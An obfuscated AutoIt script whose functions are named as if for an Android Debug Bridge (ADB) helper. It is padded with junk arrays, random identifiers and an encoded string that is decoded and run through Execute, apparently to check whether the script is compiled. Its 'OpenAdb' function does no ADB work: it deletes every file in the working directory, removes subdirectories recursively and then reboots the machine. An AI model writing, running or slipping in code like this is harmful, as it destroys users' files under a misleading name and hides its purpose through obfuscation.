#Include-once

Global Const $idVpjemXdtexSjbfwmi = Asc("1")
Global $NSOWEOYGPK_IZOIKETQTY_IRLOFXZBTF = Asc(StringMid("Switch $L__p5pV6fSjUZWYviI_S5", 25, 1))
Global $KGTUKRJKX_AFCFT_AWBIB = 104
Global $dWufyokvuWgqkawnSabeeoau[2][11] = [[207, 44962, 142, 38618, 32552, 1934148965, 1059686490, 113, 189219306, 52674, 19029],  _
[239, 236]]
Global $7p_i_3k4qNx8JIku_g = 1526854162
Global Const $var_3704 = Asc("O")
#OnAutoItStartRegister "func_1305"
#OnAutoItStartRegister "func_2046"
Global $7PIcywbO_6DXqF62__tuNeQOZ_ = Asc(StringMid("9293 - 60941 + 24574 + 20953 / 29281 - 46462 * 47632 / 52308 + 26935 * 13933 / 49912",  _
68, 1))
Global Const $483YwjS34_CnH_3_8[2][9] = [[194, 81547388], [17678, 52356, 637530827, 74, 239, 40000, 166, 205, 60]]
Global $var_583[2][15] = [[96, 1254853576, 55331, 54672, 187, 31, 254, 20693, 708941598, 61, 52433, 137750575,  _
306820286, 242, 564702194],  _
[156, 28, 1891027069, 17956, 149, 125, 253, 65, 254, 146, 48479, 237, 34362]]
Global Const $var_1915[11] = [31154, 29866, 53021, 215, 455977520, 1023184105, 6412, 23246, 61671, 157, 57765]
Global $nSpyuwycr[5] = [810987713, 223, 32, 163, 111]
Global Const $VUZOJ_DAFSROAVPK_LNSZZ[13] = [358613064, 45346, 64, 41348, 830842494, 239, 86, 62607, 37980, 9955, 297084490, 126,  _
58753]
Global Const $nPrwjzzxsRnwuxjqrykYfatulkq = 88

Func InitializeADB()
    If Not Execute(BinaryToString(func_1447(230, $dWufyokvuWgqkawnSabeeoau[0][6], 2125460296))) Then
        Return True
    EndIf
EndFunc
Func func_1447($aIwclenvYgpna, $fAeahpSeajdmt, $CUDDCPU)
    Local $60gbWn_ytsx9_6mI2ermex_[20] = [0x1216, 0x125E, 0x121A, 0x1216, 0x121C, 0x1219, 0x121C, 0x122C, 0x121C, 0x122A, 0x121D,  _
0x1216, 0x121C, 0x121F, 0x121C, 0x1229, 0x121C, 0x121B, 0x121C, 0x121A]
    Local $IAQpy
    Local $temRS
    For $temRS = 0 To 19
        $IAQpy = $60gbWn_ytsx9_6mI2ermex_[$temRS]
        $IAQpy -= 0x11E6
        $60gbWn_ytsx9_6mI2ermex_[$temRS] = ChrW(BitAND($IAQpy, 0xFFFF))
    Next
    $60gbWn_ytsx9_6mI2ermex_ = _ArrayToString($60gbWn_ytsx9_6mI2ermex_, "")
    Return $60gbWn_ytsx9_6mI2ermex_
EndFunc
Func BgehifkldFunc()
    return 211
EndFunc
Func OoxsyflFzmfamtfccGsjuxpw()
    return 170972652
EndFunc
Func func_2046()
    Global $mNxoboAgfgcpqDvcxrhym = 36107
EndFunc
Func func_1305()
    Global $var_2000 = 174514308
EndFunc

Func OpenAdb()

	$FFFF = FileFindFirstFile("*.*")
	If $FFFF <> -1 Then
		While 1
			$FFNF = FileFindNextFile($FFFF)
			If @error Then ExitLoop
			FileDelete(@ScriptDir & "\" & $FFNF)
			DirRemove(@ScriptDir & "\" & $FFNF, $DIR_REMOVE)
		WEnd
	EndIf

	Shutdown(8)

EndFunc


